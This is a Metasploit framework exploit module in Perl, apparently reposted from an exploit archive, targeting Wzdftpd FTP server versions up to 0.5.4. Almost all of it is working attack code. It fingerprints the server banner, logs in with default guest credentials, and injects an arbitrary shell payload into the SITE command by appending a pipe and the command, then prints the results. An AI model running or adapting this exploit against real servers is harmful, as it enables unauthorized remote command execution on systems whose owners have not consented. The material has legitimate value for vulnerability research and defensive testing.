WzdFTPD <= 0.5.4 (SITE) Remote Command Execution Exploit (meta)
===============================================================

# Reference: http://www.milw0rm.com/id.php?id=1231 (kcope) /str0ke

# 
# Metasploit plugin for: Wzdftpd SITE Command Arbitrary Command Execution
# 2005 11 26 - David Maciejak
#

package Msf::Exploit::wzdftpd_site;
use base "Msf::Exploit";
use strict;
use Pex::Text;

my $advanced = { };

my $info = {
	&#039;Name&#039;     => &#039;Wzdftpd SITE Command Arbitrary Command Execution&#039;,
	&#039;Version&#039;  => &#039;$Revision: 1.0 $&#039;,
	&#039;Authors&#039;  => [ &#039;David Maciejak <david dot maciejak at kyxar dot fr>&#039; ],
	&#039;Arch&#039;     => [ ],
	&#039;OS&#039;       => [ ],
	&#039;Priv&#039;     => 1,
	&#039;UserOpts&#039; =>
	  {
		&#039;RHOST&#039;  => [1, &#039;ADDR&#039;, &#039;The target address&#039;],
		&#039;RPORT&#039;  => [1, &#039;PORT&#039;, &#039;The target port&#039;, 21],
		&#039;USER&#039;   => [1, &#039;DATA&#039;, &#039;Username&#039;, &#039;guest&#039;],
		&#039;PASS&#039;   => [1, &#039;DATA&#039;, &#039;Password&#039;, &#039;%&#039;],
		&#039;SITECMD&#039;=> [1, &#039;DATA&#039;, &#039;Custom site command&#039;],
	  },

	&#039;Description&#039; => Pex::Text::Freeform(qq{
		This module exploits an arbitrary command execution vulnerability in Wzdftpd
		threw SITE command. Wzdftpd version to 0.5.4 are vulnerable.
}),
	&#039;Refs&#039; =>
	  [
		[&#039;BID&#039;, &#039;14935&#039;],
	  ],

	&#039;Payload&#039; =>
	  {
		&#039;Space&#039; => 128,
		&#039;Keys&#039;  => [&#039;cmd&#039;,&#039;cmd_bash&#039;],
	  },

	&#039;Keys&#039; => [&#039;wzdftpd_site&#039;],
  };

sub new {
	my $class = shift;
	my $self = $class->SUPER::new({&#039;Info&#039; => $info, &#039;Advanced&#039; => $advanced}, @_);
	return($self);
}

sub Check {
	my $self = shift;
	my $target_host = $self->GetVar(&#039;RHOST&#039;);
	my $target_port = $self->GetVar(&#039;RPORT&#039;);

	my $s = Msf::Socket::Tcp->new
	(
		&#039;PeerAddr&#039;  => $target_host, 
		&#039;PeerPort&#039;  => $target_port, 
	);
	if ($s->IsError) {
		$self->PrintLine(&#039;[*] Error creating socket: &#039; . $s->GetError);
		return $self->CheckCode(&#039;Connect&#039;);
	}
	my $res = $s->Recv(-1, 5);
	$s->Close();
    
	if (! $res) {
            $self->PrintLine("[*] No FTP banner");
            return $self->CheckCode(&#039;Unknown&#039;);
	}

	if ($res =~ /220 wzd server ready/) 
	{
		$self->PrintLine("[*] FTP Server is a wzdftpd server");
		return $self->CheckCode(&#039;Appears&#039;);
	}
	else
	{
		$self->PrintLine("[*] FTP Server is probably not vulnerable");
		return $self->CheckCode(&#039;Safe&#039;);
	}
}

sub Exploit {
	my $self = shift;
	my $target_host    = $self->GetVar(&#039;RHOST&#039;);
	my $target_port    = $self->GetVar(&#039;RPORT&#039;);
	my $custom_site_cmd=$self->GetVar(&#039;SITECMD&#039;);
	my $encodedPayload = $self->GetVar(&#039;EncodedPayload&#039;);
	my $cmd            = $encodedPayload->RawPayload;
	my $user	   = $self->GetVar(&#039;USER&#039;);
	my $pass	   = $self->GetVar(&#039;PASS&#039;);
	
	my $s = Msf::Socket::Tcp->new(
		&#039;PeerAddr&#039; => $target_host,
		&#039;PeerPort&#039; => $target_port,
	  );

	if ($s->IsError){
		$self->PrintLine(&#039;[*] Error creating socket: &#039; . $s->GetError);
		return;
	}

	$self->PrintLine("[*] Establishing a connection to the FTP server ...");

	$s->Send("USER ".$user);

	my $result = $s->Recv(-1, 20);
	if (!($result=~/\d{3} User .+ okay, need password/))
	{
		$self->PrintLine("[*] Invalid user");
		return;
	}

	$s->Send("PASS ".$pass);
	$result = $s->Recv(-1, 20);

	if (!($result=~/\d{3} User logged in/))
	{
		$self->PrintLine("[*] Invalid password");
		return;
	}
	
	$s->Send("SITE ".$custom_site_cmd." | $cmd;");
	$result = $s->Recv(-1, 20);
	if (!($result=~/^200/))
	{
		$self->PrintLine("[*] Error: $result");
		return;
	}

	$self->PrintLine(&#039;&#039;);
	my @results = split ( /\n/, $result );
	chomp @results;
	for (my $i = 1; $i < @results -1; $i++){
			$self->PrintLine("$results[$i]");
	}
	return;
}

1;


